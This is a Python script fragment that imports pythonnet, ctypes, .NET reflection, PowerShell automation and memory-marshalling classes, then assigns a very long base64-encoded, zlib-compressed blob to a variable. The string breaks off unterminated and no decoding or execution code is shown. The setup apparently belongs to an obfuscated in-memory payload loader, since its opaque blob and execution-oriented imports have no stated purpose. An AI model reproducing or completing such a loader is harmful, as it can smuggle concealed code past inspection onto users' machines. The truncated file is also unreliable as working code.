import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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